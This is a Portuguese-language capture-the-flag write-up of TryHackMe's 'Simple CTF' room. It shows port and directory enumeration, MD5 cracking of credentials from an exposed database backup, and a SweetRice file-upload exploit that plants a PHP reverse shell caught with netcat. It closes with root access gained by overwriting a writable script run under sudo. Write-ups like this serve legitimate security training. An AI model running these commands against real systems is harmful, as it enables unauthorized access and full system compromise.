> [!note]
>
> - **Challenge:** Simple CTF
> - **Dificuldade:** Easy
> - **Plaraforma:** TryHackMe
> - **Link:** https://tryhackme.com/room/easyctf 
> - **Autor:** hi im kvothe

# Writeup

## 1. Etapa de Reconhecimento

### 1.1 Enumeração de Portas

Ao spawnar máquina e receber o endereço IP `<TARGET_IP>` da máquina alvo, foi feito uma enumeração dos serviços que estão hospedados na máquina, por meio do comando:

```bash
nmap -T4 -sV --open <TARGET_IP>
```
obtendo o seguinte output

```bash
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-01 17:59 +0000
Nmap scan report for <TARGET_IP>
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.44 seconds
```

### 1.2 Servidor HTTP

Ao realizar uma enumeração de diretórios no servidor HTTP com o comando

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -t 20 -x txt,php,js
```

obtemos o output
```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<TARGET_IP>
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.js              (Status: 403) [Size: 276]
.htaccess            (Status: 403) [Size: 276]
.hta.php             (Status: 403) [Size: 276]
.hta.txt             (Status: 403) [Size: 276]
.hta                 (Status: 403) [Size: 276]
.htpasswd.txt        (Status: 403) [Size: 276]
.htaccess.js         (Status: 403) [Size: 276]
.htaccess.txt        (Status: 403) [Size: 276]
.htpasswd.js         (Status: 403) [Size: 276]
.htaccess.php        (Status: 403) [Size: 276]
.htpasswd            (Status: 403) [Size: 276]
.htpasswd.php        (Status: 403) [Size: 276]
content              (Status: 301) [Size: 312] [--> http://TARGET_IP/content/]
index.html           (Status: 200) [Size: 11321]
server-status        (Status: 403) [Size: 276]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```
Analisando o output, descobrimos o endpoint `/content`, o qual, quando acessado pelo navegador, exibe a seguinte mensagem

```bash
Welcome to SweetRice - Thank your for install SweetRice as your website management system.
This site is building now , please come late.

If you are the webmaster,please go to Dashboard -> General -> Website setting

and uncheck the checkbox "Site close" to open your website.

More help at Tip for Basic CMS SweetRice installed
```
Essa mensagem indica que o host está hospedando a aplicação web SweetRice. Assim, foi realizado uma enumeração de diretótios a partir do endpoint `/content` por meio do comando

```bash
gobuster dir -u http://<TARGET_IP>/content -w /usr/share/wordlists/dirb/common.txt -t 20 -x js,txt,php

```

obtendo o seguinte output

```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<TARGET_IP>/content
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,js,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.php             (Status: 403) [Size: 276]
.hta                 (Status: 403) [Size: 276]
.hta.js              (Status: 403) [Size: 276]
.htaccess            (Status: 403) [Size: 276]
.hta.txt             (Status: 403) [Size: 276]
.htpasswd.txt        (Status: 403) [Size: 276]
.htpasswd.js         (Status: 403) [Size: 276]
.htaccess.txt        (Status: 403) [Size: 276]
.htpasswd.php        (Status: 403) [Size: 276]
.htaccess.php        (Status: 403) [Size: 276]
.htaccess.js         (Status: 403) [Size: 276]
.htpasswd            (Status: 403) [Size: 276]
_themes              (Status: 301) [Size: 320] [--> http://TARGET_IP/content/_themes/]
as                   (Status: 301) [Size: 315] [--> http://TARGET_IP/content/as/]
attachment           (Status: 301) [Size: 323] [--> http://TARGET_IP/content/attachment/]
changelog.txt        (Status: 200) [Size: 18013]
images               (Status: 301) [Size: 319] [--> http://TARGET_IP/content/images/]
inc                  (Status: 301) [Size: 316] [--> http://TARGET_IP/content/inc/]
index.php            (Status: 200) [Size: 2197]
index.php            (Status: 200) [Size: 2197]
js                   (Status: 301) [Size: 315] [--> http://TARGET_IP/content/js/]
license.txt          (Status: 200) [Size: 15410]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

#### 1.2.1 Endpoint `/content/inc`

Ao acessar o endpoint `/content/inc` pelo navegador, observamos uma lista de arquivos e pastas, em particular a pasta "/mysql_backup". Ao acessar esse diretório, encontramos o arquivo "mysql_bakup_20191129023059-1.5.1.sql", o qual consiste em um arquivo de backup do banco de dados da aplicação.

#### 1.2.2 Endpoint `content/as`

Ao acessar o enpoint `/content/as` pelo navegador, observamos uma tela de login para o backoffice da aplicação.

## 2. Etapa de Exploração

Analisando o conteúdo do arquivo "mysql_bakup_20191129023059-1.5.1.sql", conseguimos extrair o nome de usuário `<USERNAME>` e o hash de uma possível senha `<PASSWORD_HASH>`. Ao usar o `hashid` para analisar o algoritmo usado no hash com o comando

```bash
hashid -m -j <PASSWORD_HASH>
```

obtemos o seguinte output

```bash
Analyzing '42f749ade7f9e195bf475f37a44cafcb'
[+] MD2 [JtR Format: md2]
[+] MD5 [Hashcat Mode: 0][JtR Format: raw-md5]
[+] MD4 [Hashcat Mode: 900][JtR Format: raw-md4]
[+] Double MD5 [Hashcat Mode: 2600]
[+] LM [Hashcat Mode: 3000][JtR Format: lm]
[+] RIPEMD-128 [JtR Format: ripemd-128]
[+] Haval-128 [JtR Format: haval-128-4]
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 [Hashcat Mode: 8600][JtR Format: lotus5]
[+] Skype [Hashcat Mode: 23]
[+] Snefru-128 [JtR Format: snefru-128]
[+] NTLM [Hashcat Mode: 1000][JtR Format: nt]
[+] Domain Cached Credentials [Hashcat Mode: 1100][JtR Format: mscach]
[+] Domain Cached Credentials 2 [Hashcat Mode: 2100][JtR Format: mscach2]
[+] DNSSEC(NSEC3) [Hashcat Mode: 8300]
[+] RAdmin v2.x [Hashcat Mode: 9900][JtR Format: radmin]
```
indicando que possivel <PASSWORD_HASH> é resultado da aplicação ou de MD5 ou MD4. Usando o `hashcat` por meio do comando

```bash
hashcat -a 0 -m 0 <PASSWORD_HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```
obtemos o output

```bash
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i5-1340P, 6816/13633 MB (2048 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 66

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 516 MB (12115 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 946729410

<PASSWORD_HASH>:<PASSWORD>              
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: <PASSWORD_HASH>
Time.Started.....: Fri May  1 18:23:18 2026 (0 secs)
Time.Estimated...: Fri May  1 18:23:18 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best66.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........: 52642.3 kH/s (14.55ms) @ Accel:1024 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1048576/946729410 (0.11%)
Rejected.........: 0/1048576 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-64 Iteration:0-64
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> liso
Hardware.Mon.#01.: Temp: 58c Util:  6%

Started: Fri May  1 18:23:03 2026
Stopped: Fri May  1 18:23:19 2026
```
indicando que o <PASSWORD_HASH> corresponde a senha <PASSWORD>. Usando <USERNAME> como conta e <PASSWORD> como senha, conseguimos nos autenticar no endpoint `/content/as`. Uma vez tendo acesso ao backoffice do Sweet Rice, podemos utilizar uma outra vulnerabilidade dessa aplicação para realizar uma shell reversa. Para isso, foi usada o script `40716.py` do ExploitDB (SweetRice 1.5.1 - Arbitrary File Upload). Pasasndo como input as informações

```bash
Enter The Target URL(Example : localhost.com) : <TARGET_IP>/content
Enter Username : <USERNAME>
Enter Password : <PASSWORD>
Enter FileName (Example:.htaccess,shell.php5,index.html) : shell2.php5
```
sendo o arquivo `shell2.php5` uma shell reversa em php, executando o `netcat` com o comando 

```bash
nc -lvnp <REVERSE_SHELL_PORT>
```
e acessando o link fornecido como output do script `40716.py` para ativar a shell, obtemos acesso à máquina alvo. A flag de usuário pode ser encontrada no arquivo `/home/itguy/user.txt`.

## 3. Escalação de Privilégio

Ao executar o comando `sudo -l`, observa-se que o usuário `<USERNAME>` possui permissão para executar o `perl` e o programa `/home/itguy/backup.pl` com permissões de root. 

```bash
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Ao analisar o conteúdo do arquivo `/home/itguy/backup.pl`

```perl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

percebemos que o arquivo executa o programa `/etc/copy.sh`. Então, se conseguirmos substituir o código original do arquivo `/etc/copy.sh` por um código que spawne uma shell, conseguiremos uma shell de nível de root, uma vez que o porgrama `/etc/copy.sh` herdará as permissões de root do programa `/home/itguy/backup.pl` se ele for executado como root. Assim, verificamos se era possível escrever no arquivo `/etc/copy.sh` por meio do comando

```bash
ls -la /etc/copy.sh
```
Analisando o output do comando

```bash
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

concluímos que o nosso usuário pode escrever nesse programa. Assim, o programa `/etc/copy.sh` foi modificado conforme o comando abaixo.

```bash
 echo 'exec "/bin/bash"' > /etc/copy.sh
```

Em seguida, o arquivo `/home./itguy/backup.pl` foi executado por meio do comando

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

obtendo uma shell de nível de root. Assim, a flag de root pode ser encontrada no arquivo `/root/root.txt`.
